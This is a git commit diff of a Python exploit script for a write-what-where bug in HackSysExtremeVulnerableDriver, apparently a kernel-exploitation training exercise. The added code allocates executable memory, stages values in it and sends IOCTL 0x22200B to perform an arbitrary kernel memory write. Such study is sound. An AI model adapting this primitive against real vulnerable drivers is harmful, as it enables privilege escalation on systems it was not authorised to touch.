089630585f99ac4455fe7d569eb5dc525b04d905
AMatchandaHaystack <51268526+AMatchandaHaystack@users.noreply.github.com>
2020-10-22 16:28:59 -0400

    Update writewhatwhere.py

--- writewhatwhere.py
+++ writewhatwhere.py
@@ -6,28 +6,47 @@ from win32com.shell import shell
 ntdll = windll.ntdll
 kernel32 = windll.kernel32
 gdi32 = windll.gdi32
-user32 = windll.user32
+user32 = windll.user32 
 
-def arbitrary_overwrite():
-    """ Main Logic """
-    driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
-    if not driver_handle or driver_handle == -1:
-        print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
-        sys.exit()
-    else:
-                print "[X] Communicated with appropriate driver."
+ntdll.NtAllocateVirtualMemory.argtypes = [c_ulonglong, POINTER(c_ulonglong), c_ulonglong, POINTER(c_ulonglong), c_ulonglong, c_ulonglong]
 
-                where_ptr = 4242424242424242
-                what_ptr = 4141414141414141
-                whatwhere = struct.pack("<Q", what_ptr) + struct.pack("<Q", where_ptr)
-                input_size = len(whatwhere)
-                dwReturn = c_ulonglong() #all 64 bit so longlong...
-                IOCTL = "0x22200B"
-                kernel32.DeviceIoControl(driver_handle,IOCTL,whatwhere,input_size,None,0,byref(dwReturn),None)  
+STATUS_SUCCESS = 0
+written = c_size_t()
 
+# Allocate memory to use for the HEVD Leak
+baseadd = c_ulonglong(0x000000001a000000) # Easy to recognize arbitrary address
+addsize = c_ulonglong(0x3000) # Arbitrary size
+dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFFFFFFFFFF, byref(baseadd), 0x0, byref(addsize), (win32con.MEM_COMMIT | win32con.MEM_RESERVE), win32con.PAGE_EXECUTE_READWRITE)
+if dwStatus != STATUS_SUCCESS:
+	log("Something went wrong while allocating memory","e")
+	getLastError()
+	sys.exit()
 
+def writeQWORD(driver=None, what=None, where=None):
+	what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
+  # Write the what value to what_addr
+	data = struct.pack("<Q", what)
+	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, what_addr, data, len(data), byref(written))
+	if dwStatus == 0:
+		log("Something went wrong while writing to memory","e")
+		getLastError()
+		sys.exit()
+  
+  # Pack the address of the what value and the where address
+	data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
+	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
+	if dwStatus == 0:
+		log("Something went wrong while writing to memory","e")
+		getLastError()
+		sys.exit()
 
+	IoControlCode = 0x0022200B
+	InputBuffer = c_void_p(0x000000001a000000)
+	InputBufferLength = 0x10
+	OutputBuffer = c_void_p(0x00000001a002000)
+	OutputBufferLength = 0x0
+	dwBytesReturned = c_ulong()
+	lpBytesReturned = byref(dwBytesReturned)
 
-        
-if __name__ == '__main__':
-    arbitrary_overwrite()
+	triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
+	return triggerIOCTL
